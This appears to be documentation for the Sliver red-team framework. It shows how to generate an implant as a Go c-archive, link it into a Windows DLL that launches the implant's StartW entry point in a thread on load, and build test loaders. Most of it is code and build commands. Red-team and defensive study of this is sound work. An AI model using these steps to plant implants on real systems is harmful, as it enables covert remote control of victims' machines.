Sliver can generate Go c-archive output for use in native link workflows. The archive format returns a ZIP bundle containing the generated static archive (`.a`) and C headers (`.h`) produced by Go's `c-archive` build mode.

Use this format when you want to link the generated implant entrypoint into another native artifact, such as a DLL or application, and validate that the exported symbol resolves correctly in your own loader or harness.

## Generate an Archive

For the example, a Windows archive was generated via the Sliver console:

```shell
sliver > generate --format archive --os windows --arch amd64 --mtls 127.0.0.1
```

The output ZIP contains an archive (`.a`) file and the headers (`.h`).

```text
ARCHITECTURAL_YOKE.a
ARCHITECTURAL_YOKE.h
main.h
```

If no export symbols are configured, Sliver exports `StartW` by default. The examples below assume the generated implant name is `ARCHITECTURAL_YOKE`; replace that name with the files generated in your environment.

## Link the Archive into a DLL

Create a wrapper that calls `StartW` from a worker thread when the DLL loads, which keeps `DllMain` lightweight and avoids doing long-running initialization work while the Windows loader lock is held.

```cpp
#include "ARCHITECTURAL_YOKE.h"
#include <windows.h>

DWORD WINAPI WorkerThread(LPVOID lpParam)
{
    StartW();
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);

        HANDLE hThread = CreateThread(NULL, 0, WorkerThread, NULL, 0, NULL);
        if (hThread != NULL) {
            CloseHandle(hThread);
        }
    }
    return TRUE;
}
```

Compile the wrapper and link it with the generated archive:

```shell
x86_64-w64-mingw32-g++ -std=c++11 -Wall -I. -shared -o beacon.dll wrapper.cpp ARCHITECTURAL_YOKE.a
```

## Validate Symbol Resolution

Sample minimal loader to confirm the DLL loads and the `StartW` export resolves:

```c
#include <windows.h>
#include <stdio.h>

int main() {
    HMODULE h = LoadLibraryA("beacon.dll");
    if (!h) {
        printf("LoadLibrary failed: %lu\n", GetLastError());
        return 1;
    }

    FARPROC p = GetProcAddress(h, "StartW");
    printf("LoadLibrary OK, StartW=%p\n", p);

    FreeLibrary(h);
    return 0;
}
```

Build the loader:

```shell
x86_64-w64-mingw32-gcc -Wall -o loader.exe loader.c
```

Run the loader in an authorized local test environment with `beacon.dll` in the same directory.

## Validate Invocation

To validate that the resolved entrypoint can be invoked, use a small test application:

```c
#include <windows.h>
#include <stdio.h>

typedef void (*StartWFn)(void);

int main() {
    HMODULE h = LoadLibraryA("beacon.dll");
    if (!h) {
        printf("LoadLibrary failed: %lu\n", GetLastError());
        return 1;
    }

    StartWFn StartW = (StartWFn)GetProcAddress(h, "StartW");
    if (!StartW) {
        printf("GetProcAddress failed: %lu\n", GetLastError());
        return 1;
    }

    printf("Calling StartW...\n");
    StartW();

    printf("StartW returned\n");
    FreeLibrary(h);
    return 0;
}
```

Build the invocation test:

```shell
x86_64-w64-mingw32-gcc -Wall -o call_startw.exe call_startw.c
```

This validates the archive-to-DLL link path, DLL loading, export lookup, and `StartW` invocation all work as expected.

